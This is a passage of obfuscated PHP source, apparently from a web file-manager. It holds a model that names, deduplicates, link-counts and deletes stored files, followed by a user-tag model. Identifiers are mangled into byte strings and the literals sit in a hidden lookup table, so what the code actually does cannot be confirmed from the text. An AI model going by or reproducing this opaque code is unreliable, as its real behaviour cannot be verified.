} public function createFileName($˜×ß·Ãñ, $Æ¬Øí«‚, $¡ šû = false, $·ãşÕÀŒ = false) { $Ô¡Ûû¸’ =& $_SERVER[åÄ¼Ùßš]; $ÙÍè÷Ş¥ = IO::init($Ô¡Ûû¸’[8]); $æÍûÖ † = $this->_makeFilePath($˜×ß·Ãñ, $Æ¬Øí«‚, $ÙÍè÷Ş¥, $¡ šû, $·ãşÕÀŒ); $Ê°ˆ› = $ÙÍè÷Ş¥->pathFather($æÍûÖ †); static $¯Üı±«ì = false; $Ç‰¸¾„À = $Ô¡Ûû¸’[2070] . md5($Ê°ˆ›); if (!$¯Üı±«ì && !Cache::get($Ç‰¸¾„À)) { $¯Üı±«ì = !0; $ÃµÎ˜¼´ = IO::mkdir($Ê°ˆ›); if (!IO::exist($ÃµÎ˜¼´ . $Ô¡Ûû¸’[895])) { IO::mkfile($ÃµÎ˜¼´ . $Ô¡Ûû¸’[895]); } Cache::set($Ç‰¸¾„À, 1, 3600 * 2); } return $æÍûÖ †; } public function _makeFilePath($¢„·ÉÓµ, $ãÀÉóìó, $£‡³›¿, $¿¹¬ŒƒÅ = false, $¨ÂÈ«®ş = false) { $Ì Ø×Ú =& $_SERVER[åÄ¼Ùßš]; $‚ù…‘İÚ = Model($Ì Ø×Ú[866])->get($Ì Ø×Ú[2071]); $±ß¬¯¬Ğ = $Ì Ø×Ú[1360] . $ãÀÉóìó[$Ì Ø×Ú[484]] . $Ì Ø×Ú[496] . date($Ì Ø×Ú[2072]); $ ²ÃêÑ¿ = $±ß¬¯¬Ğ . rand_string(5) . short_id(100); $¢„·ÉÓµ = str_replace($Ì Ø×Ú[8], $Ì Ø×Ú[11], KodIO::clear($¢„·ÉÓµ)); $êÓğÈúÌ = $£‡³›¿->ext($¢„·ÉÓµ); if (!$¢„·ÉÓµ) { $‚ù…‘İÚ = $Ì Ø×Ú[872]; } switch ($‚ù…‘İÚ) { case $Ì Ø×Ú[2073]: if ($êÓğÈúÌ) { $ ²ÃêÑ¿ = $ ²ÃêÑ¿ . $Ì Ø×Ú[10] . $êÓğÈúÌ; } if ($êÓğÈúÌ == $Ì Ø×Ú[2010]) { $ ²ÃêÑ¿ .= $Ì Ø×Ú[1329]; } break; case $Ì Ø×Ú[2074]: $¹Œñ¤áÛ = Model($Ì Ø×Ú[866])->get($Ì Ø×Ú[867]); $¬ÀËÅÚ = substr(md5($Ì Ø×Ú[868] . $¹Œñ¤áÛ . date($Ì Ø×Ú[842])), 0, 8); $±ß¬¯¬Ğ = $Ì Ø×Ú[1360] . $ãÀÉóìó[$Ì Ø×Ú[484]] . $Ì Ø×Ú[496] . date($Ì Ø×Ú[2075]) . $¬ÀËÅÚ . $Ì Ø×Ú[8]; if ($êÓğÈúÌ == $Ì Ø×Ú[2010]) { $¢„·ÉÓµ .= $Ì Ø×Ú[1329]; } $¬ï»ƒ„Ú = $Ì Ø×Ú[2076] . $±ß¬¯¬Ğ . $¢„·ÉÓµ; CacheLock::lock($¬ï»ƒ„Ú); $ ²ÃêÑ¿ = $±ß¬¯¬Ğ . $¢„·ÉÓµ; if (IO::exist($±ß¬¯¬Ğ . $¢„·ÉÓµ)) { $±ïƒÓš = substr($¢„·ÉÓµ, 0, strlen($¢„·ÉÓµ) - strlen($êÓğÈúÌ)); $—å—î¢ò = $¨ÂÈ«®ş ? substr($¨ÂÈ«®ş, 0, 5) : ($¿¹¬ŒƒÅ ? substr($¿¹¬ŒƒÅ, 0, 5) : rand_string(5)); $—å—î¢ò .= rand_string(3); $ ²ÃêÑ¿ = $±ß¬¯¬Ğ . $±ïƒÓš . $—å—î¢ò; if ($êÓğÈúÌ) { $ ²ÃêÑ¿ = $ ²ÃêÑ¿ . $Ì Ø×Ú[10] . $êÓğÈúÌ; } } if (IO::isOsDriver($ ²ÃêÑ¿) && !IO::isUploadServer($ ²ÃêÑ¿)) { if (IO::exist($ ²ÃêÑ¿)) { CacheLock::unlock($¬ï»ƒ„Ú); return $ ²ÃêÑ¿; } $¬åÍŒÆ = IO::setContent($ ²ÃêÑ¿, $Ì Ø×Ú[12]); if (!$¬åÍŒÆ) { show_json($Ì Ø×Ú[2077], !1); } } CacheLock::unlock($¬ï»ƒ„Ú); break; case $Ì Ø×Ú[872]: break; default: break; } return $ ²ÃêÑ¿; } public function addFileByRemote($ÀĞ¤óºİ, $¾û”«¦, $ÌğÕÁİé = array()) { $Ç¶ûÊ„ê =& $_SERVER[åÄ¼Ùßš]; if (!IO::isFile($ÀĞ¤óºİ)) { return !1; } $€¶ˆº° = $ÌğÕÁİé[$Ç¶ûÊ„ê[560]] ? $ÌğÕÁİé[$Ç¶ûÊ„ê[560]] : $Ç¶ûÊ„ê[12]; $±Ïˆ¨¼î = IO::hashMd5($ÀĞ¤óºİ, $€¶ˆº°); $îùâòÀ = KodIO::parse($ÀĞ¤óºİ); $ï Øïùº = array($Ç¶ûÊ„ê[633] => IO::size($ÀĞ¤óºİ), $Ç¶ûÊ„ê[2078] => 1, $Ç¶ûÊ„ê[506] => $¾û”«¦, $Ç¶ûÊ„ê[909] => $îùâòÀ[$Ç¶ûÊ„ê[484]], $Ç¶ûÊ„ê[507] => $ÀĞ¤óºİ, $Ç¶ûÊ„ê[2079] => $ÌğÕÁİé[$Ç¶ûÊ„ê[688]] ? $ÌğÕÁİé[$Ç¶ûÊ„ê[688]] : IO::hashSimple($ÀĞ¤óºİ), $Ç¶ûÊ„ê[2080] => $±Ïˆ¨¼î ? $±Ïˆ¨¼î : $€¶ˆº°); if ($Îšğ—µË = $this->addFileCheckExist($ï Øïùº[$Ç¶ûÊ„ê[688]], $ï Øïùº[$Ç¶ûÊ„ê[560]], $ï Øïùº[$Ç¶ûÊ„ê[79]])) { return $Îšğ—µË; } return $this->addFileData($ï Øïùº); } private function addFileData($…™½æ¢) { $ÎüÈ­ÂÕ =& $_SERVER[åÄ¼Ùßš]; if (!$…™½æ¢) { return !1; } if (!IO::isFile($…™½æ¢[$ÎüÈ­ÂÕ[87]])) { return !1; } $…™½æ¢[$ÎüÈ­ÂÕ[79]] = intval($…™½æ¢[$ÎüÈ­ÂÕ[79]]); if (!$…™½æ¢[$ÎüÈ­ÂÕ[79]] && strlen($…™½æ¢[$ÎüÈ­ÂÕ[688]]) > 32) { $…™½æ¢[$ÎüÈ­ÂÕ[79]] = intval(substr($…™½æ¢[$ÎüÈ­ÂÕ[688]], 32)); } $Ô€öŒØ¥ = $this->add($…™½æ¢); return $this->find($Ô€öŒØ¥); } public function addFile($êØş˜ºÉ, $£Œï“¿¤, $«µ¦öè², $·İªÖ‡ = false) { $Ì–Êª =& $_SERVER[åÄ¼Ùßš]; $Ø”Ÿ‡„È = IO::hashSimple($êØş˜ºÉ); $ü¨ëÙ ² = IO::size($êØş˜ºÉ); $êÛûˆ·Ù = $ü¨ëÙ ² <= 1024 * 1024 * 10 ? IO::hashMd5($êØş˜ºÉ) : $Ì–Êª[12]; $„“ûµè“ = $Ì–Êª[2081] . $Ø”Ÿ‡„È; CacheLock::lock($„“ûµè“); if ($êÛûˆ·Ù && $Ø”Ÿ‡„È) { $·«Ÿãí‚ = $this->addFileCheckExist($Ø”Ÿ‡„È, $êÛûˆ·Ù, $ü¨ëÙ ²); if ($·«Ÿãí‚) { CacheLock::unlock($„“ûµè“); return $·«Ÿãí‚; } } $¼õ”çĞÑ = $this->addFileMake($êØş˜ºÉ, $£Œï“¿¤, $ü¨ëÙ ², $Ø”Ÿ‡„È, $êÛûˆ·Ù, $«µ¦öè², $·İªÖ‡); $İ¶¢»× = $this->addFileData($¼õ”çĞÑ); if (!$İ¶¢»×) { return !1; } CacheLock::unlock($„“ûµè“); if (!$êÛûˆ·Ù && $İ¶¢»×) { $this->fileMd5Check($İ¶¢»×); } return $İ¶¢»×; } public function fileMd5Check($Ü–ƒğ¢ë) { $û¤‹øÏ° =& $_SERVER[åÄ¼Ùßš]; $Ññòè˜á = array($Ü–ƒğ¢ë[$û¤‹øÏ°[554]], $Ü–ƒğ¢ë[$û¤‹øÏ°[87]]); $›ÏôüÈé = $û¤‹øÏ°[2082] . $Ü–ƒğ¢ë[$û¤‹øÏ°[87]]; $”æ‘Ò¦º = $û¤‹øÏ°[2083] . $Ü–ƒğ¢ë[$û¤‹øÏ°[554]]; TaskQueue::add($û¤‹øÏ°[2084], $Ññòè˜á, $›ÏôüÈé, $”æ‘Ò¦º); } public function fileMd5Set($Á©ìğíş, $âšõÍ¦½) { $­‚€¸ÎŠ =& $_SERVER[åÄ¼Ùßš]; $Õ‚™è‰ã = $this->find($Á©ìğíş); if (!$Õ‚™è‰ã || $Õ‚™è‰ã[$­‚€¸ÎŠ[560]]) { return; } $áÕ¤Òç = IO::hashMd5($âšõÍ¦½); if (!$áÕ¤Òç) { return $­‚€¸ÎŠ[12]; } $this->where(array($­‚€¸ÎŠ[554] => $Á©ìğíş))->save(array($­‚€¸ÎŠ[560] => $áÕ¤Òç)); } public function addFileMake($ÔÅÔ®›, $íæÑ´ÏĞ, $À¸´åö, $‘¾÷ˆƒë, $õ…Û±äÆ, $ªÑôâæ˜, $ª¡ÇÙ½) { $ìÔÄøÏÈ =& $_SERVER[åÄ¼Ùßš]; $¯ê ®• = $this->createFileName($ªÑôâæ˜, $íæÑ´ÏĞ, $‘¾÷ˆƒë, $õ…Û±äÆ); $¢¥áØœ¹ = get_path_father($¯ê ®•); $Ø“ü ‹Å = get_path_this($¯ê ®•); if ($ª¡ÇÙ½) { $†û‚÷©Ô = IO::move($ÔÅÔ®›, $¢¥áØœ¹, !1, $Ø“ü ‹Å); } else { $†û‚÷©Ô = IO::copy($ÔÅÔ®›, $¢¥áØœ¹, !1, $Ø“ü ‹Å); } if (!$†û‚÷©Ô) { return !1; } $¿Ä‡ñãÛ = IO::init($†û‚÷©Ô); $¿Ä‡ñãÛ->cacheMethod($ìÔÄøÏÈ[182], $¿Ä‡ñãÛ->path, $ìÔÄøÏÈ[179]); if (IO::size($†û‚÷©Ô) != $À¸´åö) { return !1; } $³¾Ü©ò¯ = array($ìÔÄøÏÈ[633] => $À¸´åö, $ìÔÄøÏÈ[2078] => 1, $ìÔÄøÏÈ[506] => $ªÑôâæ˜, $ìÔÄøÏÈ[909] => $íæÑ´ÏĞ[$ìÔÄøÏÈ[484]], $ìÔÄøÏÈ[507] => $¯ê ®•, $ìÔÄøÏÈ[2079] => $‘¾÷ˆƒë, $ìÔÄøÏÈ[2080] => $õ…Û±äÆ); return $³¾Ü©ò¯; } public function addFileCheckExist($ãÓïáÇí, $Ä‹©”ÂÑ, $Ü‚­ Â™) { $úÍÒ²¿ò =& $_SERVER[åÄ¼Ùßš]; $ÀÑÏ¥¯ = $this->findByHash($ãÓïáÇí, $Ä‹©”ÂÑ); if (!$ÀÑÏ¥¯) { return !1; } $à¾Çšİá = array($úÍÒ²¿ò[2078] => intval($ÀÑÏ¥¯[$úÍÒ²¿ò[2085]]) + 1, $úÍÒ²¿ò[633] => $Ü‚­ Â™); $this->where(array($úÍÒ²¿ò[555] => $ÀÑÏ¥¯[$úÍÒ²¿ò[554]]))->save($à¾Çšİá); return $ÀÑÏ¥¯; } public function remove($÷òÆ¦ª) { $this->linkCountChange($÷òÆ¦ª, !1); $this->clearEmpty(); return !0; } public function linkAdd($»ı—‹ª) { $this->linkCountChange($»ı—‹ª, !0); } public function linkCountChange($¿úõÙŠˆ, $º£©¯¸‰) { $Ö«†ù¿³ =& $_SERVER[åÄ¼Ùßš]; if (!$¿úõÙŠˆ) { return; } if (!is_array($¿úõÙŠˆ)) { $¿úõÙŠˆ = array($¿úõÙŠˆ); } $ĞàÉ¡‡– = array(); foreach ($¿úõÙŠˆ as $Ø½¼Ó‰) { $±Èøæ«ã = $Ø½¼Ó‰ . $Ö«†ù¿³[12]; if (!$ĞàÉ¡‡–[$±Èøæ«ã]) { $ĞàÉ¡‡–[$±Èøæ«ã] = 0; } $ĞàÉ¡‡–[$±Èøæ«ã]++; } $›´¿ÎÒ– = array(); foreach ($ĞàÉ¡‡– as $Ø½¼Ó‰ => $–€å¸¦Í) { $±Èøæ«ã = $–€å¸¦Í . $Ö«†ù¿³[12]; if (!$›´¿ÎÒ–[$±Èøæ«ã]) { $›´¿ÎÒ–[$±Èøæ«ã] = array(); } $›´¿ÎÒ–[$±Èøæ«ã][] = $Ø½¼Ó‰; } foreach ($›´¿ÎÒ– as $–€å¸¦Í => $¨·­”«Ó) { if (!$¨·­”«Ó) { continue; } $–€å¸¦Í = $º£©¯¸‰ ? $–€å¸¦Í : -intval($–€å¸¦Í); $©³±¤º³ = array($Ö«†ù¿³[554] => array($Ö«†ù¿³[7], $¨·­”«Ó)); if ($–€å¸¦Í < 0) { $©³±¤º³[$Ö«†ù¿³[2085]] = array($Ö«†ù¿³[1123], abs($–€å¸¦Í)); } $this->where($©³±¤º³)->setAdd($Ö«†ù¿³[2085], $–€å¸¦Í); } } public function findByHash($ƒÎÅË¬ñ, $Ú¾ù¡Ï = false) { $»€ÑÃè¾ =& $_SERVER[åÄ¼Ùßš]; if (!$ƒÎÅË¬ñ && !$Ú¾ù¡Ï) { return !1; } $èƒúç¡º = array($»€ÑÃè¾[2079] => $ƒÎÅË¬ñ); if ($Ú¾ù¡Ï) { $èƒúç¡º = array($»€ÑÃè¾[2080] => $Ú¾ù¡Ï); } return $this->order($»€ÑÃè¾[2086])->where($èƒúç¡º)->find(); } public function clearEmpty($öÃ·ÔÒ¨ = 1) { $·È„¹â =& $_SERVER[åÄ¼Ùßš]; $æÈ­çıØ = time() - 3600 * 24 * $öÃ·ÔÒ¨; $Í›í¡°€ = $·È„¹â[2087] . $æÈ­çıØ; $ç¹½¿ì = $this->where($Í›í¡°€)->select(); if (!$ç¹½¿ì) { return; } $óäÌËÎ = new Task($·È„¹â[2088], $·È„¹â[12], count($ç¹½¿ì)); foreach ($ç¹½¿ì as $ûãóØğÒ) { $óäÌËÎ->update(1); $this->resetFile($ûãóØğÒ); } $óäÌËÎ->end(); } public function resetFile($ÃŞÎß¡³) { $è»óÁº® =& $_SERVER[åÄ¼Ùßš]; $«Ø·âÃ‘ = array($è»óÁº®[555] => $ÃŞÎß¡³[$è»óÁº®[554]]); $Å¢¬Ò‘ï = Model($è»óÁº®[1466])->where($«Ø·âÃ‘)->count(); $›•ÕŞÈÙ = Model($è»óÁº®[2089])->where($«Ø·âÃ‘)->count(); $áŠïºÚ = intval($Å¢¬Ò‘ï) + intval($›•ÕŞÈÙ); if ($áŠïºÚ == 0) { Model($è»óÁº®[2090])->delete($ÃŞÎß¡³[$è»óÁº®[554]]); $this->where($«Ø·âÃ‘)->delete(); $this->metaSet($ÃŞÎß¡³[$è»óÁº®[554]], null, null); if (!IO::isFile($ÃŞÎß¡³[$è»óÁº®[87]])) { write_log(array($è»óÁº®[2091], ACTION, $ÃŞÎß¡³), $è»óÁº®[1302]); return !1; } IO::remove($ÃŞÎß¡³[$è»óÁº®[87]]); write_log(ACTION . $è»óÁº®[934] . KodUser::id() . $è»óÁº®[2092] . $ÃŞÎß¡³[$è»óÁº®[554]] . $è»óÁº®[2093] . $ÃŞÎß¡³[$è»óÁº®[79]] . $è»óÁº®[202] . $ÃŞÎß¡³[$è»óÁº®[87]], $è»óÁº®[2091]); return; } if ($ÃŞÎß¡³[$è»óÁº®[2085]] != $áŠïºÚ) { $this->where($«Ø·âÃ‘)->save(array($è»óÁº®[2078] => $áŠïºÚ)); } } public function storageInfo($‡ú³Åœ´ = false) { $æØÁƒ€´ =& $_SERVER[åÄ¼Ùßš]; $ÊÕûâ¢ = $this->count() + 0.0; $ØÄŸ­Ú¢ = 0; $û£©«—’ = 1; $ÍÒßêŒ = 0; $è‰â«ä = 5000; for ($¹Êø“—§ = 0; $¹Êø“—§ < $ÊÕûâ¢; $¹Êø“—§ = $¹Êø“—§ + $è‰â«ä) { $ïô¹–™ê = $this->limit($¹Êø“—§, $¹Êø“—§ + $è‰â«ä)->select(); foreach ($ïô¹–™ê as $åĞ‘ÜŞ) { $û£©«—’ += $åĞ‘ÜŞ[$æØÁƒ€´[79]] * $åĞ‘ÜŞ[$æØÁƒ€´[2085]]; $ØÄŸ­Ú¢ += $åĞ‘ÜŞ[$æØÁƒ€´[79]] * ($åĞ‘ÜŞ[$æØÁƒ€´[2085]] - 1); $ÍÒßêŒ += $åĞ‘ÜŞ[$æØÁƒ€´[2085]]; } } $çÃñÆ£¬ = array($æØÁƒ€´[2094] => $û£©«—’, $æØÁƒ€´[2095] => $ØÄŸ­Ú¢, $æØÁƒ€´[2096] => $ØÄŸ­Ú¢ / $û£©«—’, $æØÁƒ€´[83] => $ÊÕûâ¢, $æØÁƒ€´[2097] => $ÍÒßêŒ); return $çÃñÆ£¬; } } goto dÖÇÓ—°Ê; aÌ»Ç˜ˆ’É: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\x66\141\166"; protected function cacheFunctionAlias($İø´ïŒş) { $˜ï¶óŒÄ =& $_SERVER[åÄ¼Ùßš]; return array($˜ï¶óŒÄ[2132] => array($˜ï¶óŒÄ[2573] . USER_ID, $˜ï¶óŒÄ[2133])); } protected function listData() { $æÂÇû‰ö =& $_SERVER[åÄ¼Ùßš]; $ûÁ¡À„ = array($æÂÇû‰ö[1808] => USER_ID, $æÂÇû‰ö[570] => array($æÂÇû‰ö[2136], 0)); $ô™…Ûªä = $æÂÇû‰ö[2574]; $Òöª¿ı = $this->field($ô™…Ûªä)->where($ûÁ¡À„)->order($æÂÇû‰ö[2138])->select(); return $Òöª¿ı ? $Òöª¿ı : array(); } protected function addToTag($…ù—‚Óõ, $ôşÕŒıü) { $µÅ³Óèå =& $_SERVER[åÄ¼Ùßš]; if (!Model($µÅ³Óèå[2296])->listData($ôşÕŒıü)) { return !1; } if (is_numeric($…ù—‚Óõ)) { $“àôÚ‚¿ = Model($µÅ³Óèå[926])->pathInfo($…ù—‚Óõ); if (!$“àôÚ‚¿) { return !1; } } else { $“àôÚ‚¿ = IO::infoSimple($…ù—‚Óõ); if (!$“àôÚ‚¿) { return !1; } $Æ¶÷‚ = $“àôÚ‚¿[$µÅ³Óèå[32]]; $º§¥ÖÅæ = $“àôÚ‚¿[$µÅ³Óèå[33]]; if (isset($“àôÚ‚¿[$µÅ³Óèå[497]])) { $º§¥ÖÅæ = $“àôÚ‚¿[$µÅ³Óèå[497]] == $µÅ³Óèå[91] ? $µÅ³Óèå[78] : $µÅ³Óèå[233]; } } $ÀÙŠš² = array($µÅ³Óèå[1808] => USER_ID, $µÅ³Óèå[570] => $ôşÕŒıü, $µÅ³Óèå[507] => $…ù—‚Óõ, $µÅ³Óèå[508] => $º§¥ÖÅæ ? $º§¥ÖÅæ : $µÅ³Óèå[502], $µÅ³Óèå[506] => $Æ¶÷‚ ? $Æ¶÷‚ : $µÅ³Óèå[12], $µÅ³Óèå[2021] => 0); if ($this->where($ÀÙŠš²)->find()) { return !1; } return $this->add($ÀÙŠš²); } protected function removeFromTag($»ü¢Ó«æ, $½€½®·Ü) { $ışÇçÎ =& $_SERVER[åÄ¼Ùßš]; if (!Model($ışÇçÎ[2296])->listData($½€½®·Ü)) { return !1; } if (is_array($»ü¢Ó«æ)) { $»ü¢Ó«æ = array($ışÇçÎ[7], $»ü¢Ó«æ); } $ìÚíç˜Ï = array($ışÇçÎ[1808] => USER_ID, $ışÇçÎ[570] => $½€½®·Ü, $ışÇçÎ[507] => $»ü¢Ó«æ); return $this->where($ìÚíç˜Ï)->delete(); } protected function removeByTag($¹óÏî™á) { $€Â‚±½… =& $_SERVER[åÄ¼Ùßš]; if (!$¹óÏî™á) { return !1; } $€¸ú‘­ = array($€Â‚±½…[1808] => USER_ID, $€Â‚±½…[570] => $¹óÏî™á); return $this->where($€¸ú‘­)->delete(); } protected function removeBySource($·Ñ°ö¡¨) { $äó˜¶õõ =& $_SERVER[åÄ¼Ùßš]; if (is_array($·Ñ°ö¡¨)) { $·Ñ°ö¡¨ = array($äó˜¶õõ[7], $·Ñ°ö¡¨); } $•¶Ë¶à = array($äó˜¶õõ[1808] => USER_ID, $äó˜¶õõ[570] => array($äó˜¶õõ[1122], 0), $äó˜¶õõ[507] => $·Ñ°ö¡¨); return $this->where($•¶Ë¶à)->delete(); } }